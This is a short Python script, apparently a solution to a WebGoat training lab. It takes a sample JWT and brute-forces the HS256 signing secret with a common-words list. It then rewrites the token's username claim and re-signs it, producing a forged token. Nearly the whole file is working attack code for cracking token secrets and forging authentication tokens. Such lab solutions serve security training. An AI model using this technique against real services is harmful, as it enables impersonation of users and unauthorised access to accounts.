import base64
import json
import hmac
import hashlib

def get_signature(msg, secret):
  sign_bytes = hmac.new(secret, msg, digestmod=hashlib.sha256).digest()
  return base64.urlsafe_b64encode(sign_bytes).replace(b'=', b'').decode('utf-8')

def base64_to_dict(encoded):
  decoded = base64.b64decode(encoded)
  return json.loads(decoded)

def dict_to_base64(decoded: str) -> str:
  stringified = json.dumps(decoded, separators=(',', ':'))  
  return (
    base64.b64encode(stringified.encode('utf-8'))).decode('utf-8')

encoded_jwt = """
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYx
ODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2Vy
bmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwi
UHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM
""".replace(' ', '').replace('\n', '')

header, payload, signature = encoded_jwt.split('.')
original_signature = signature

message = f'{header}.{payload}'
possible_key = 'test'

# hs256_alg = jwt.algorithms.get_default_algorithms().get('HS256')

def find_secret(original_signature):
  with open('google-10000-english.txt', 'rb') as words_file:
    for word in (line.strip() for line in words_file):
      possible_signature = get_signature(message.encode('utf-8'), word)
      if possible_signature == original_signature:
        print(f'Secret found: {word}')
        return word

secret = find_secret(original_signature)

payload_dict = base64_to_dict(payload)
payload_dict['username'] = 'WebGoat'
new_payload = dict_to_base64(payload_dict)

message = f'{header}.{new_payload}'
signature = get_signature(message.encode('utf-8'), b'victory')

jwt = message + '.' + signature
print(jwt)